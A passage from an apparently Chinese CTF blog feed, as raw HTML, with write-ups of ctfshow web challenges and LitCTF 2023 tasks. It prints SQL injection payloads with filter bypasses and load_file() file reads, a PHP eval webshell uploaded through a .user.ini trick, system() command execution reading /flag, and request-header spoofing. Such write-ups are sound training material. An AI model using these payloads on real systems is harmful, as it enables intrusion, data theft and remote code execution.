print(&#x27;</span>数据库名/表名/字段名/数据: %s<span class="hljs-string">&#x27; % name)</span><br><span class="hljs-string">            break</span><br><span class="hljs-string"> </span><br><span class="hljs-string">        # 如果某个字符不存在,则停止程序</span><br><span class="hljs-string">        count += 1</span><br><span class="hljs-string">        if count &gt;= (128 - 31):</span><br><span class="hljs-string">            exit()</span><br></code></pre></td></tr></table></figure><p>获取数据库<br><img src="/images/23.png"></p><p>获取表<br><img src="/images/233.png"></p><p>获取字段<br><img src="/images/2333.png"></p><p>获取flag<br><img src="/images/23333.png"></p><h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p>这题不能用常规方法做<br>在url中输入index.phps，可以发现下载了一个文件，打开。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$password</span>)&gt;<span class="hljs-number">10</span>)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;password error&quot;</span>);<br>&#125;<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>,<span class="hljs-literal">true</span>).<span class="hljs-string">&quot;&#x27;&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_num_rows</span>(<span class="hljs-variable">$result</span>)&gt;<span class="hljs-number">0</span>)&#123;<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>(<span class="hljs-variable">$result</span>))&#123;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;登陆成功&lt;br&gt;&quot;</span>;<br> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br> &#125;<br>&#125;<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>发现是使用MD5加密，利用MD5的漏洞在密码中输入ffidyop，登录成功，得到flag</p><h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>打开页面，是登录页面<br><img src="/images/258.png"></p><p>点击取消，自动下载源码文件index.phps</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">replaceSpecialChar</span>(<span class="hljs-params"><span class="hljs-variable">$strParam</span></span>)</span>&#123;<br>             <span class="hljs-variable">$regex</span> = <span class="hljs-string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;<br>             <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$regex</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$strParam</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$con</span>)<br>        &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Could not connect: &#x27;</span> . <span class="hljs-title function_ invoke__">mysqli_error</span>());<br>        &#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$username</span>)!=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">replaceSpecialChar</span>(<span class="hljs-variable">$username</span>)))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;sql inject error&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$password</span>)!=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">replaceSpecialChar</span>(<span class="hljs-variable">$password</span>)))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;sql inject error&quot;</span>);<br>&#125;<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from user where username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_num_rows</span>(<span class="hljs-variable">$result</span>)&gt;<span class="hljs-number">0</span>)&#123;<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>(<span class="hljs-variable">$result</span>))&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$password</span>==<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;password&#x27;</span>])&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;登陆成功&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><br> &#125;<br>&#125;<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>  <figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nsis">if(<span class="hljs-keyword">strlen</span>(<span class="hljs-variable">$username</span>)!=<span class="hljs-keyword">strlen</span>(replaceSpecialChar(<span class="hljs-variable">$username</span>)))&#123;<br>die(<span class="hljs-string">&quot;sql inject error&quot;</span>)<span class="hljs-comment">;</span><br>&#125;<br>if(<span class="hljs-keyword">strlen</span>(<span class="hljs-variable">$password</span>)!=<span class="hljs-keyword">strlen</span>(replaceSpecialChar(<span class="hljs-variable">$password</span>)))&#123;<br>die(<span class="hljs-string">&quot;sql inject error&quot;</span>)<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>   若要单纯绕过$regex &#x3D; “&#x2F;(select|from|where|join|sleep|and|\s|union|,)&#x2F;i”;这个过来替换，用双写绕过即可，<br>    但下面还有限制，查询出来的值要和我们post的值相等：</p><p>  这就使得双写不能用，此处只能用 <strong>WITH ROLLUP</strong> 进行绕过<br>   <strong>with rollup</strong> 可以对 group by 分组结果再次进行分组，并在最后添加一行数据用于展示结果(对group by 未指定的字段进行求和汇总，而group by指定的分组字段则用null占位)</p><p>   我们使用万能钥匙<code>(a&#39;/**/or/**/ture/**/#)</code>使SQL成立绕过用户名之后，后台的SQL会查询出所有的用户信息，然后依次判断查询处的用户名对应的密码和我们输入的密码是否相同，这时候我们使用with rollup 对group by 分组的结果再次进行求和统计，由于with rollup 不会对group by 分组的字段(password)进行统计，所以会在返回结果的最后一行用null来填充password，这样一来我们的返回结果中就有了一个值为null的password，只要我们登录的时候password输入框什么都不输，那么我输入的password的值就是null，跟查询出的用户密码相同(null&#x3D;&#x3D;null)，从而登录成功。<br>   payload：<br>   <figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">a&#x27;<span class="hljs-comment">/**/</span><span class="hljs-literal">or</span><span class="hljs-comment">/**/</span><span class="hljs-literal">true</span><span class="hljs-comment">/**/</span>group<span class="hljs-comment">/**/</span>by<span class="hljs-comment">/**/</span>password<span class="hljs-comment">/**/</span><span class="hljs-keyword">with</span><span class="hljs-comment">/**/</span>rollup<span class="hljs-comment">/**/</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure></p><p>   得到flag</p><h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">replaceSpecialChar</span>(<span class="hljs-params"><span class="hljs-variable">$strParam</span></span>)</span>&#123;<br>             <span class="hljs-variable">$regex</span> = <span class="hljs-string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;<br>             <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$regex</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$strParam</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$password</span>)!=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">replaceSpecialChar</span>(<span class="hljs-variable">$password</span>)))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;sql inject error&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$password</span>==<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;password&#x27;</span>])&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;error&quot;</span>;<br>        &#125;<br></code></pre></td></tr></table></figure><p>本题和web10有很多相同的地方，但是这一题出flag的条件是<code>$password==$_SESSION[&#39;password&#39;]</code> password是我们自己输入的，session中的password存储在本地，所以我们只要输入空密码，并且将本地的session删除即可成功绕过,获得flag<br><img src="/images/259.png"></p><p>Session是另一种记录客户状态的机制，它是在服务器上面，客户端浏览器访问服务器的时候，服务器把客户端信息以某种形式记录在服务器上。这就是Session。客户端浏览器再次访问时只需要从该Session中查找该客户的状态就可以了。<br><a href="https://www.cnblogs.com/l199616j/p/11195667.html">session与cookie传送门</a></p><p>或者我们也可以用burp suite来做题<br>先抓登录的包<br><img src="/images/K.png"><br>此时我们可以看到密码是123456，但提交了这个密码又是错误的，这里我们把cookie的内容删除了，密码123456也删除掉<br><img src="/images/xx.png"><br>大功告成！</p><h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><p>打开网站发现没有可用的注入点，应该不是注入了，ctrl+u查看源码，发现提示<code>?cmd=</code><br><img src="/images/0102.png"></p><p>在网站上输入<code>?cmd=phpinfo();</code> (phpinfo函数可以显示出PHP 所有相关信息。是排查配置php是是否出错或漏配置模块的主要方式之一！)发现有回显<br><img src="/images/nt.png"></p><p>这里会用到一个php函数glob();<br>glob()函数返回匹配指定模式的文件名或目录。<br>例：<br>glob(“*”)匹配任意文件<br>glob(“.txt”)匹配以txt为后缀的文件</p><p>有了这个方法我们可以先把当前目录下所有的文件找出来看看有没有可用的，<br>输入<code>?cmd=print_r(glob(&quot;*&quot;));</code><br>此时页面显示了如下内容<br><img src="/images/MC.png"></p><p>我们试一下第一个php文件<br>这是我们使用highlight_file()函数显示php文件<br><img src="/images/BM.png"><br>获得flag</p><h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><p>进入题目，发现是一道文件上传题，<br>先在url中输入upload.php.bak(bak是备份文件)<br>下载了一个文件，内容如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$temp_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><span class="hljs-variable">$size</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>];<br><span class="hljs-variable">$error</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>];<br><span class="hljs-variable">$arr</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$filename</span>);<br><span class="hljs-variable">$ext_suffix</span> = <span class="hljs-variable">$arr</span>[<span class="hljs-string">&#x27;extension&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$size</span> &gt; <span class="hljs-number">24</span>)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error file zise&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$filename</span>)&gt;<span class="hljs-number">9</span>)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error file name&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$ext_suffix</span>)&gt;<span class="hljs-number">3</span>)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error suffix&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php/i&quot;</span>,<span class="hljs-variable">$ext_suffix</span>))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error suffix&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php/i&quot;</span>),<span class="hljs-variable">$filename</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error file name&quot;</span>);<br>    &#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_name</span>, <span class="hljs-string">&#x27;./&#x27;</span>.<span class="hljs-variable">$filename</span>))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件上传成功！&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件上传失败！&quot;</span>;<br>&#125;<br><br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>发现上传过滤了php大小写，就是说上传的内容不能为.php后缀了，同时上传文件大小不能大于24字节，文件名不能大于9<br>所以我们写一个1.txt文件，内容为<code>&lt;?php eval($_POST[&#39;a&#39;]);</code><br>刚好24字节<br>上传成功，再写一个.user.ini文件，内容为 <code>auto_prepend_file=1.txt</code><br>上传成功后，打开中国蚁剑，连接成功后发现没有权限操作，回到页面，POST提交<br><code>a=print_r(glob(&quot;*&quot;));</code><br>发现一串长的php文件，<code>a=highlight_file(&#39;903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php&#39;);</code><br>提交后成功显示flag</p><h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><p>php sleep()函数的意思是括号里等于几页面就会等待多少秒执行<br>看了一遍发现case 3适合我们去试试,因为case 3后没有break，在等待3秒后就会执行3和case 6000的内容，把url显示出来<br>url输入?c&#x3D;3<br><img src="/images/U1PFC.png"><br>url输入得到的信息<br><img src="/images/5TH.png"><br>进入一个新的页面<br>显而易见是个sql注入<br>先查看源码，提取关键信息</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">if</span>(preg<span class="hljs-constructor">_match(&#x27;<span class="hljs-operator">/</span><span class="hljs-params">information_schema</span>\.<span class="hljs-params">tables</span>|<span class="hljs-params">information_schema</span>\.<span class="hljs-params">columns</span>|<span class="hljs-params">linestring</span>| |<span class="hljs-params">polygon</span><span class="hljs-operator">/</span><span class="hljs-params">is</span>&#x27;, $<span class="hljs-params">_GET</span>[&#x27;<span class="hljs-params">query</span>&#x27;])</span>)&#123;<br>die(&#x27;@A@&#x27;);<br>&#125;<br></code></pre></td></tr></table></figure><p>发现了过滤了 <code>information_schema.tables</code><br><code>information_schema.columns</code><br><code>linestring polygon</code><br>还有空格<br>空格可用&#x2F;**&#x2F;代替<br>在这里提供一种绕过的方法——反引号<br>反引号：他是为了区分mysql的保留字与普通字符而引入的符号<br>例如：<code>information_schema.tables和information_schema.`tables`  </code>都可以使用</p><p>接下来使用联合注入<br><strong>爆库(web)</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">-<span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/**/</span>select<span class="hljs-regexp">/**/</span>database()<br></code></pre></td></tr></table></figure><p><strong>爆表(content)</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">-<span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/**/</span>select<span class="hljs-regexp">/**/g</span>roup_concat(table_name)<span class="hljs-regexp">/**/</span>from<span class="hljs-regexp">/**/i</span>nformation_schema.`tables`<span class="hljs-regexp">/**/</span>where<span class="hljs-regexp">/**/</span>table_schema=database()<br></code></pre></td></tr></table></figure><p><strong>爆字段(id,username,password)</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">-<span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/**/</span>select<span class="hljs-regexp">/**/g</span>roup_concat(column_name)<span class="hljs-regexp">/**/</span>from<span class="hljs-regexp">/**/i</span>nformation_schema.`columns`<span class="hljs-regexp">/**/</span>where<span class="hljs-regexp">/**/</span>table_name=<span class="hljs-string">&#x27;content&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>爆值</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">-<span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/**/</span>select<span class="hljs-regexp">/**/g</span>roup_concat(id,username,password)<span class="hljs-regexp">/**/</span>from<span class="hljs-regexp">/**/</span>content<br></code></pre></td></tr></table></figure><p>爆值这发现了问题<br><img src="/images/I1PJ.png"><br>并没有找出flag<br>提取关键字 <strong>tell you a secret,secert has a secret…</strong><br>所以flag很可能在secret.php中，现在有一个问题，我们怎么从数据库中查看文件内容呢，mysql提供了读取本地文件的函数load_file()<br>所以我们构造语句</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">-<span class="hljs-number">1</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span>load<span class="hljs-constructor">_file(&#x27;<span class="hljs-operator">/</span><span class="hljs-params">var</span><span class="hljs-operator">/</span><span class="hljs-params">www</span><span class="hljs-operator">/</span><span class="hljs-params">html</span><span class="hljs-operator">/</span><span class="hljs-params">secret</span>.<span class="hljs-params">php</span>&#x27;)</span><br></code></pre></td></tr></table></figure><p>查看源码发现了如下内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;here_1s_your_f1ag.php&#x27;</span>;<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;/tmp/gtf1y&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">trim</span>(@<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>)) === <span class="hljs-string">&#x27;ctf.show&#x27;</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/real_flag_is_here&#x27;</span>);<br>&#125;<span class="hljs-string">&#x27;)</span><br></code></pre></td></tr></table></figure><p>也就是如果&#x2F;tmp&#x2F;gtf1y中的内容为ctf.show则输出&#x2F;real_flag_is_here中的值，我们有这个函数可以直接读取</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">-<span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/**/</span>select<span class="hljs-regexp">/**/</span>load_file(<span class="hljs-string">&#x27;/real_flag_is_here&#x27;</span>)<br></code></pre></td></tr></table></figure><p>查看源码，发现flag已经出现在源码中</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>litctf_2023</title>
    <link href="/2023/05/20/litctf_2023/"/>
    <url>/2023/05/20/litctf_2023/</url>
    
    <content type="html"><![CDATA[<h2 id="导弹迷踪"><a href="#导弹迷踪" class="headerlink" title="导弹迷踪"></a>导弹迷踪</h2><p>题目描述已经告诉了答案，只要通过第六关就能拿到flag，也有一种方法，<br>ctrl+u查看源代码<br>拉到最下面，看到了一堆js文件，挨个访问，最后我们再game.js文件发现了很多leval关键词，ctrl+f全局搜索level<br>发现了flag<br><img src="/images/A9.png"></p><h2 id="1zjs"><a href="#1zjs" class="headerlink" title="1zjs"></a>1zjs</h2><p>打开题目是一个可操作的魔方，它并没有告诉获得flag的方式，而且魔方是没有打乱的，所以好像和魔方并没有什么关系，我们打开源码<br>突然想到作者在题目描述里提到了js<br><img src="/images/GJ.png"><br>果然源码中有一个js文件可以点击<br><img src="/images/VG.png"><br>点进去，emmm。。。好多代码，不要慌!尝试从js或注释或php里入手，ctrl+f全局搜索一下，js没有有用的信息。搜索注释，太多了，最后实在没办法再考虑。搜索php，我们发现有一个被注释的php文件<br><img src="/images/QI.png"><br>在url中输入刚刚的php文件试试<br><img src="/images/KC.png"><br>虽然看起来像乱码，但php应该不会乱来，搜索查阅一下，发现这是jsfuck加密<br><a href="http://www.hiencode.com/jsfuck.html">jsfuck</a><br>密码搞里头<br><img src="/images/EE.png"><br>得到flag，记得要把flag中的[]手动删除再提交才能成功通过</p><h2 id="PHP是世界上最好的语言"><a href="#PHP是世界上最好的语言" class="headerlink" title="PHP是世界上最好的语言"></a>PHP是世界上最好的语言</h2><p>题目描述里作者给我们透漏flag位于根目录<br>给了一个注入点，尝试一下能不能命令执行，输入system(“ls”)<br><img src="/images/RR.png"><br>发现并没有flag，这时候想到了作者的提示，直接system(“ls &#x2F;“)<br><img src="/images/5K.png"><br>成功发现flag文件，cat它，system(“cat &#x2F;flag”);<br><img src="/images/2U.png"><br>成功获取flag</p><h2 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h2><p>直接system(“ls”)不行<br>输入一个正常ip：127.0.0.1<br><img src="/images/F.png"><br>有显示点，用burpsuite抓包试试，发现ip是command显示的，修改一下command的内容<br><img src="/images/P.png"><br>没有发现flag，返回上一级看看<br><img src="/images/T5.png"><br>成功找到</p><p>找到直接抓就可以了<br><img src="/images/U.png"><br>成功获取flag</p><h2 id="我Flag呢？"><a href="#我Flag呢？" class="headerlink" title="我Flag呢？"></a>我Flag呢？</h2><p>题很简单，打开源码，最下面就是</p><h2 id="Follow-me-and-hack-me"><a href="#Follow-me-and-hack-me" class="headerlink" title="Follow me and hack me"></a>Follow me and hack me</h2><p><img src="/images/T2O.png"></p><p>根据题意get：CTF&#x3D;Lit2023<br>POST：Challenge&#x3D;i’m_c0m1ng</p><p><img src="/images/LW.png"><br>在hackbar上操作，得到flag<br>输入 <a href="http://www.zip/">www.zip</a> 可以查看源码，还有一个flag文件，但什么也没写</p><h2 id="作业管理系统"><a href="#作业管理系统" class="headerlink" title="作业管理系统"></a>作业管理系统</h2><p>先进入源码查看，给了账户和密码<br>进入发现可以进行文件上传<br>那么我们上传一个带有木马的php文件试试<br>php文件内容为<?php eval($_POST['a']);?><br>上传成功后再url中输入你的php文件名以进入<br>打开中国蚁剑，复制刚才的url地址<br><img src="/images/N69.png"><br>成功进入<br>接下来在文件中找flag就行了<br>还有一种方法是：<br>进入到你提交的文件后打开hackbar，用post提交分别输入<br>a&#x3D;system(“ls”);<br>a&#x3D;system(“ls &#x2F;“);<br>a&#x3D;system(“cat &#x2F;flag”);</p><h2 id="vim-yyds"><a href="#vim-yyds" class="headerlink" title="vim yyds"></a>vim yyds</h2><p>vim编辑的index.php文件，在编辑状态强制退出终端，会在同目录下产生一个.index.php.swp文件，所以我们可以访问.index.php.swp，下载下来<br>当我们下载下来会发现都是一些乱码<br><img src="/images/SW.png"><br>往下翻发现了我们需要的内容，但这些内容却不知道它们的次序与是否为完整内容<br>我们先提取关键字password与cmd都为post，password&#x3D;Give_Me_Your_Flag，但还有一个if ($_POST[‘password’] &#x3D;&#x3D;&#x3D; base64_encode($password)),把password内容编码为base64形式即可，接着我们再看eval(system($_POST[‘cmd’]));system在外面，意味着我们可以直接在cmd写命令，先让cmd&#x3D;ls试试<br><img src="/images/HC.png"><br>可以看到，页面成功显示了命令执行的结果,接下来就到了熟悉的操作了，首先看看根目录，cmd&#x3D;ls &#x2F;<br><img src="/images/H3S1.png"><br>发现flag，接下来cmd&#x3D;cat &#x2F;flag<br>即可得出flag的值</p><h2 id="http-pro-max-plus"><a href="#http-pro-max-plus" class="headerlink" title="http pro max plus"></a>http pro max plus</h2><p>进入页面，只显示了一个**只允许本地访问，查看源码发现什么都没有，那么我们burpsuite抓包试试<br>只允许在本地使用的话我们先来个x-forwarded-for:127.0.0.1<br><img src="/images/POR.png"><br>显示不行，那么我们换一种方式<br>client-ip: 127.0.0.1<br><img src="/images/G7.png"><br>提示我们需要from pornhub.com<br>那我们再添加一个referer: pornhub.com<br><img src="/images/9D.png"><br>接着页面再提示我们需要用chrome浏览器<br>所以我们把UA头改为Chrome<br><img src="/images/S6.png"><br>这时有提示了需要开代理才行<br>那么我们再添加一个via:Clash.win<br><img src="/images/shit.png"><br>获得了一个.php文件<br>访问它<br>进入了发现除了step2外并没有什么特别的东西<br>打开源码看看<br><img src="/images/dumu.png"><br>emmm,又是一个线索<br>打开它，直接获得flag</p><h2 id="这是什么？sql！注一下"><a href="#这是什么？sql！注一下" class="headerlink" title="这是什么？sql！注一下"></a>这是什么？sql！注一下</h2><p><img src="/images/Y.png"><br>直接分析上图中的语句得知要闭合语句则要加6个括号<br>那么我们开始命令执行</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>))))))<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()#<br></code></pre></td></tr></table></figure><p><img src="/images/DO.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>))))))<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span 